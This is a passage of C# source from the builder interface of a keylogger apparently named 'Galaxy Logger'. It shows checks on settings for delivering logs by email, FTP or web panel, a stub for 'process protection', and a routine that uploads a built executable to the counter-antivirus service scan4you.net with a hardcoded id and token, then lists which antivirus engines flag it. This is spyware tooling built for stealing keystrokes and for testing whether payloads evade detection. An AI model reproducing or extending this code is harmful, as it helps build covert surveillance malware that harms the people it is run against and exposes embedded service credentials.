                            MessageBox.Show("Log failed to upload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         
                    }
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }

        }
        private bool DeliverySettingsFilled()
        {
            if (rbEmail.Checked)
            {
                return !(string.IsNullOrEmpty(tbEmailUsername.AmbianceTB.Text) || string.IsNullOrEmpty(tbEmailPassword.AmbianceTB.Text) || string.IsNullOrEmpty(tbEmailServer.AmbianceTB.Text) || string.IsNullOrEmpty(nudLogInterval.Value.ToString()));
            }
            else if (rbFTP.Checked)
            {
                return !(string.IsNullOrEmpty(tbFTPUsername.AmbianceTB.Text) || string.IsNullOrEmpty(tbFTPPassword.AmbianceTB.Text) || string.IsNullOrEmpty(tbFTPServer.AmbianceTB.Text));
            }
            else if (rbPanel.Checked)
            {
                return !string.IsNullOrEmpty(tbWebPanelUploadKey.AmbianceTB.Text);
            }
            return false;
        }
        #region " news "
        private void loadNews()
        {
           /* if (zLicense != null)
            {
                NewsPost[] postArray = zLicense.News;
                News news = new News(this);
                news.Show();
                news.InitNews(postArray.Length);
                for (int i = 0; i < postArray.Length; i++)
                {
                    news.AddItem(new string[] { postArray[i].Time.ToShortDateString() + " - " + postArray[i].Time.ToShortTimeString(), postArray[i].Name, zLicense.GetPostMessage(postArray[i].ID) });
                }


            }
            else
            {
               //Do Nothing           
            }*/

        }
        public class News : Form
        {
            private NSButton cmdReturnToMain;
            private IContainer components = null;
            private NSListView ListViewNews;
            private NSTheme Theme;
            private Form1 zForm1;
            private string[][] zNews;
            private int zOffset;

            public News(Form1 pForm1)
            {
                this.zForm1 = pForm1;
                this.InitializeComponent();
                this.zForm1.Hide();
                this.zNews = null;
                this.zOffset = 0;
            }

            public void AddItem(string[] pSubitemsText)
            {
                this.zNews[this.zOffset] = new string[] { pSubitemsText[2], pSubitemsText[1] };
                this.ListViewNews.AddItem(pSubitemsText[0], Brushes.White, new string[] { pSubitemsText[1] });
                this.zOffset++;
            }

            private void cmdCloseNews_Click(object sender, EventArgs e)
            {
                this.zForm1.Show();
                base.Close();
                base.Dispose();
            }

            protected override void Dispose(bool disposing)
            {
                if (disposing && (this.components != null))
                {
                    this.components.Dispose();
                }
                base.Dispose(disposing);
            }

            private int getOffset(NSListView.NSListViewItem pItem)
            {
                NSListView.NSListViewItem[] items = this.ListViewNews.Items;
                for (int i = 0; i < items.Length; i++)
                {
                    if (items[i].Equals(pItem))
                    {
                        return i;
                    }
                }
                return -1;
            }

            private void InitializeComponent()
            {
                NSListView.NSListViewColumnHeader header = new NSListView.NSListViewColumnHeader();
                NSListView.NSListViewColumnHeader header2 = new NSListView.NSListViewColumnHeader();
                ComponentResourceManager manager = new ComponentResourceManager(typeof(News));
                this.Theme = new NSTheme();
                this.cmdReturnToMain = new NSButton();
                this.ListViewNews = new NSListView();
                this.Theme.SuspendLayout();
                base.SuspendLayout();
                this.Theme.AccentOffset = 0;
                this.Theme.BackColor = Color.FromArgb(50, 50, 50);
                this.Theme.BorderStyle = FormBorderStyle.None;
                this.Theme.Colors = new Bloom[0];
                this.Theme.Controls.Add(this.cmdReturnToMain);
                this.Theme.Controls.Add(this.ListViewNews);
                this.Theme.Customization = "";
                this.Theme.Dock = DockStyle.Fill;
                this.Theme.Font = new Font("Verdana", 8f);
                this.Theme.Image = null;
                this.Theme.Location = new Point(0, 0);
                this.Theme.Movable = true;
                this.Theme.Name = "Theme";
                this.Theme.NoRounding = false;
                this.Theme.Sizable = false;
                this.Theme.Size = new Size(0x11c, 0x128);
                this.Theme.SmartBounds = true;
                this.Theme.StartPosition = FormStartPosition.WindowsDefaultLocation;
                this.Theme.TabIndex = 0;
                this.Theme.Text = "Galaxy Logger News";
                this.Theme.TransparencyKey = Color.Empty;
                this.Theme.Transparent = false;
                this.cmdReturnToMain.Location = new Point(12, 0x109);
                this.cmdReturnToMain.Name = "cmdReturnToMain";
                this.cmdReturnToMain.Size = new Size(260, 0x17);
                this.cmdReturnToMain.TabIndex = 1;
                this.cmdReturnToMain.Text = "Close news and return to main menu";
                this.cmdReturnToMain.Click += new EventHandler(this.cmdCloseNews_Click);
                header.Text = "Date";
                header.Width = 130;
                header2.Text = "Title";
                header2.Width = 140;
                this.ListViewNews.Columns = new NSListView.NSListViewColumnHeader[] { header, header2 };
                this.ListViewNews.Items = new NSListView.NSListViewItem[0];
                this.ListViewNews.Location = new Point(12, 0x25);
                this.ListViewNews.MultiSelect = true;
                this.ListViewNews.Name = "ListViewNews";
                this.ListViewNews.Size = new Size(260, 0xde);
                this.ListViewNews.TabIndex = 0;
                this.ListViewNews.DoubleClick += new EventHandler(this.ListViewNews_DoubleClick);
                base.AutoScaleDimensions = new SizeF(6f, 13f);
                base.AutoScaleMode = AutoScaleMode.Font;
                base.ClientSize = new Size(0x11c, 0x128);
                base.Controls.Add(this.Theme);
                base.FormBorderStyle = FormBorderStyle.None;
                base.Icon = (Icon)manager.GetObject("$this.Icon");
                base.Name = "News";
                this.Text = "News";
                this.Theme.ResumeLayout(false);
                base.ResumeLayout(false);
            }

            public void InitNews(int pLength)
            {
                this.zNews = new string[pLength][];
            }

            private void ListViewNews_DoubleClick(object sender, EventArgs e)
            {
                NSListView.NSListViewItem[] selectedItems = this.ListViewNews.SelectedItems;
                if (selectedItems.Length != 0)
                {
                    int index = this.getOffset(selectedItems[0]);
                    if (index >= 0)
                    {
                        MessageBox.Show(this.zNews[index][0], this.zNews[index][1], MessageBoxButtons.OK);
                    }
                }
            }
        }
        #endregion
        private void bbCodeLabel_Click(object sender, EventArgs e)
        {
            //
        }

        #region " Scanner "
        private void scanBrowseButton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                    scanBrowseTextbox.Text = ofd.FileName;
            }

        }

        private void avScanButton_Click(object sender, EventArgs e)
        {

             OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Executables | *.exe",
                Title = "Select an executable which should be scanned",
                CheckFileExists = true
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                Scan4You you = new Scan4You(/*zLicense.GetVariable("s4yid")*/"34681", /*zLicense.GetVariable("s4ytok")*/"fe8f7ffa233eb2e6f189");
                new Thread((ThreadStart) (() => MessageBox.Show("Scan started, please be patient while the scan is being performed!", "Scan started", MessageBoxButtons.OK, MessageBoxIcon.Asterisk))).Start();
                string str = you.Scan(dialog.FileName);
                if (string.IsNullOrEmpty(str))
                {
                    MessageBox.Show("Error while scanning, failed to retrieve the results", "Error occured", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                try
                {
                    Scan scan = new Scan(this);
                    string[] strArray = this.parseScanResults(str);
                    for (int i = 0; i < strArray.Length; i++)
                    {
                        string[] strArray2 = strArray[i].Split(new string[] { "\":\"" }, StringSplitOptions.RemoveEmptyEntries);
                        scan.AddItem(new string[] { strArray2[0], strArray2[1].Replace(@"\/", "/") });
                    }
                    base.Hide();
                    scan.Show();
                }
                catch
                {
                    MessageBox.Show("Error while parsing the scan results", "Error occured", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                finally
                {
                    you.Dispose();
                }
            }
            MessageBox.Show("Currently being worked on", "Sorry",
MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk);
        }
        internal class Scan4You
        {
            private string zID;
            private string zToken;

            public Scan4You(string pID, string pToken)
            {
                this.zID = pID;
                this.zToken = pToken;
            }

            public void Dispose()
            {
                this.zToken = null;
                this.zID = null;
            }

            ~Scan4You()
            {
                this.Dispose();
            }

            public string Scan(string pFilename)
            {
                try
                {
                    WebClient client = new WebClient();
                    Dictionary<string, object> postdata = new Dictionary<string, object>();
                    postdata.Add("id", this.zID);
                    postdata.Add("token", this.zToken);
                    postdata.Add("action", "file");
                    string filename = pFilename.Substring(pFilename.LastIndexOf('\\') + 1);
                    postdata.Add("uppload", new FormUpload.FileParameter(System.IO.File.ReadAllBytes(pFilename), filename));
                    postdata.Add("frmt", "json");
                    postdata.Add("link", "1");
                    HttpWebResponse response = null;
                    (new Thread(new ThreadStart((MethodInvoker)delegate { response = FormUpload.MultipartFormDataPost("http://scan4you.net/remote.php", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0", postdata, new string[0]); }))).Start();
                    while (response == null)
                    {
                        Application.DoEvents();
                        Thread.Sleep(50);
                    }
                    return new StreamReader(response.GetResponseStream()).ReadToEnd();
                }
                catch
                {
                    return null;
                }
            }

            private static class FormUpload
            {
                private static readonly Encoding encoding = Encoding.UTF8;

                private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
                {
                    Stream stream = new MemoryStream();
                    bool flag = false;
                    foreach (KeyValuePair<string, object> pair in postParameters)
                    {
                        if (flag)
                        {
                            stream.Write(encoding.GetBytes("\r\n"), 0, encoding.GetByteCount("\r\n"));
                        }
                        flag = true;
                        if (pair.Value is FileParameter)
                        {
                            FileParameter parameter = (FileParameter)pair.Value;
                            object[] args = new object[] { boundary, pair.Key, parameter.FileName ?? pair.Key, parameter.ContentType ?? "application/octet-stream" };
                            string str = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n", args);
                            stream.Write(encoding.GetBytes(str), 0, encoding.GetByteCount(str));
                            stream.Write(parameter.File, 0, parameter.File.Length);
                        }
                        else
                        {
                            string str2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}", boundary, pair.Key, pair.Value);
                            stream.Write(encoding.GetBytes(str2), 0, encoding.GetByteCount(str2));
                        }
                    }
                    string s = "\r\n--" + boundary + "--\r\n";
                    stream.Write(encoding.GetBytes(s), 0, encoding.GetByteCount(s));
                    stream.Position = 0L;
                    byte[] buffer = new byte[stream.Length];
                    stream.Read(buffer, 0, buffer.Length);
                    stream.Close();
                    return buffer;
                }

                public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters, string[] headers)
                {
                    string boundary = string.Format("----------{0:N}", Guid.NewGuid());
                    string contentType = "multipart/form-data; boundary=" + boundary;
                    byte[] multipartFormData = GetMultipartFormData(postParameters, boundary);
                    return PostForm(postUrl, contentType, multipartFormData, headers);
                }

                private static HttpWebResponse PostForm(string postUrl, string contentType, byte[] formData, string[] headers)
                {
                    HttpWebRequest request = WebRequest.Create(postUrl) as HttpWebRequest;
                    if (request == null)
                    {
                        throw new NullReferenceException("request is not a http request");
                    }
                    request.Method = "POST";
                    request.ContentType = contentType;
                    request.ContentLength = formData.Length;
                    for (int i = 0; i < headers.Length; i++)
                    {
                        request.Headers.Add(headers[i]);
                    }
                    using (Stream stream = request.GetRequestStream())
                    {
                        stream.Write(formData, 0, formData.Length);
                        stream.Close();
                    }
                    return (request.GetResponse() as HttpWebResponse);
                }

                public class FileParameter
                {
                    public FileParameter(byte[] file)
                        : this(file, null)
                    {
                    }

                    public FileParameter(byte[] file, string filename)
                        : this(file, filename, null)
                    {
                    }

                    public FileParameter(byte[] file, string filename, string contenttype)
                    {
                        this.File = file;
                        this.FileName = filename;
                        this.ContentType = contenttype;
                    }

                    public string ContentType { get; set; }

                    public byte[] File { get; set; }

                    public string FileName { get; set; }
                }
            }
        }
        public class Scan : Form
        {
            private NSButton cmdOpenScanResults;
            private NSButton cmdReturnToMain;
            private IContainer components = null;
            private NSListView ListViewScan;
            private NSTheme Theme;
            private Form1 zForm1;
            private string zScanLink;

            public Scan(Form1 pForm1)
            {
                this.zForm1 = pForm1;
                this.zScanLink = "";
                this.InitializeComponent();
            }



            private void cmdOpenScanResults_Click(object sender, EventArgs e)
            {
                try
                {
                    Process.Start(this.zScanLink);
                }
                catch
                {
                    MessageBox.Show("Could not open the results in a web browser!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }

            private void cmdReturnToMain_Click(object sender, EventArgs e)
            {
                this.zForm1.Show();
                base.Close();
                base.Dispose();
            }

            protected override void Dispose(bool disposing)
            {
                if (disposing && (this.components != null))
                {
                    this.components.Dispose();
                }
                base.Dispose(disposing);
            }

            private void InitializeComponent()
            {
                NSListView.NSListViewColumnHeader header = new NSListView.NSListViewColumnHeader();
                NSListView.NSListViewColumnHeader header2 = new NSListView.NSListViewColumnHeader();
                ComponentResourceManager manager = new ComponentResourceManager(typeof(Scan));
                this.Theme = new NSTheme();
                this.cmdReturnToMain = new NSButton();
                this.ListViewScan = new NSListView();
                this.cmdOpenScanResults = new NSButton();
                this.Theme.SuspendLayout();
                base.SuspendLayout();
                this.Theme.AccentOffset = 0;
                this.Theme.BackColor = Color.FromArgb(50, 50, 50);
                this.Theme.BorderStyle = FormBorderStyle.None;
                this.Theme.Colors = new Bloom[0];
                this.Theme.Controls.Add(this.cmdReturnToMain);
                this.Theme.Controls.Add(this.ListViewScan);
                this.Theme.Controls.Add(this.cmdOpenScanResults);
                this.Theme.Customization = "";
                this.Theme.Dock = DockStyle.Fill;
                this.Theme.Font = new Font("Verdana", 8f);
                this.Theme.Image = null;
                this.Theme.Location = new Point(0, 0);
                this.Theme.Movable = true;
                this.Theme.Name = "Theme";
                this.Theme.NoRounding = false;
                this.Theme.Sizable = false;
                this.Theme.Size = new Size(0x145, 0x233);
                this.Theme.SmartBounds = true;
                this.Theme.StartPosition = FormStartPosition.WindowsDefaultLocation;
                this.Theme.TabIndex = 0;
                this.Theme.Text = "GalaxyLogger Scan Results";
                this.Theme.TransparencyKey = Color.Empty;
                this.Theme.Transparent = false;
                this.cmdReturnToMain.Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
                this.cmdReturnToMain.Location = new Point(0xa9, 0x210);
                this.cmdReturnToMain.Name = "cmdReturnToMain";
                this.cmdReturnToMain.Size = new Size(0x90, 0x17);
                this.cmdReturnToMain.TabIndex = 2;
                this.cmdReturnToMain.Text = "Return to Main Menu";
                this.cmdReturnToMain.Click += new EventHandler(this.cmdReturnToMain_Click);
                header.Text = "Scanner";
                header.Width = 150;
                header2.Text = "Result";
                header2.Width = 50;
                this.ListViewScan.Columns = new NSListView.NSListViewColumnHeader[] { header, header2 };
                this.ListViewScan.Items = new NSListView.NSListViewItem[0];
                this.ListViewScan.Location = new Point(12, 0x20);
                this.ListViewScan.MultiSelect = true;
                this.ListViewScan.Name = "ListViewScan";
                this.ListViewScan.Size = new Size(0x12d, 490);
                this.ListViewScan.TabIndex = 1;
                this.cmdOpenScanResults.Font = new Font("Verdana", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
                this.cmdOpenScanResults.Location = new Point(12, 0x210);
                this.cmdOpenScanResults.Name = "cmdOpenScanResults";
                this.cmdOpenScanResults.Size = new Size(0x90, 0x17);
                this.cmdOpenScanResults.TabIndex = 0;
                this.cmdOpenScanResults.Text = "Open the Scan-Results";
                this.cmdOpenScanResults.Click += new EventHandler(this.cmdOpenScanResults_Click);
                base.AutoScaleDimensions = new SizeF(6f, 13f);
                base.AutoScaleMode = AutoScaleMode.Font;
                base.ClientSize = new Size(0x145, 0x233);
                base.Controls.Add(this.Theme);
                base.FormBorderStyle = FormBorderStyle.None;
                base.Icon = (Icon)manager.GetObject("$this.Icon");
                base.Name = "Scan";
                this.Text = "Scan";
                this.Theme.ResumeLayout(false);
                base.ResumeLayout(false);
            }
            public void AddItem(string[] pSubitemsText)
            {
                Brush green = Brushes.Green;
                if (pSubitemsText[1] != "OK")
                {
                    if (pSubitemsText[0] == "LINK")
                    {
                        this.zScanLink = pSubitemsText[1].Replace("URL=", "");
                        return;
                    }
                    green = Brushes.Red;
                }
                this.ListViewScan.AddItem(pSubitemsText[0], green, new string[] { pSubitemsText[1] });
            }
        }
        private string[] parseScanResults(string pServerResponse)
        {
            try
            {
                pServerResponse = pServerResponse.Replace("{\"", "");
                pServerResponse = pServerResponse.Replace("\"}", "");
                return pServerResponse.Split(new string[] { "\",\"" }, StringSplitOptions.RemoveEmptyEntries);
            }
            catch
            {
                return null;
            }
        }
        #endregion

        private void webpanelButton_Click(object sender, EventArgs e)
        {

        }

        private void cbProcessProtection_CheckedChanged(object sender)
        {
           // cbProcessProtection.Checked = !cbProcessProtection.Checked;
        }

        private void Theme_Click(object sender, EventArgs e)
        {

        }
    }
}
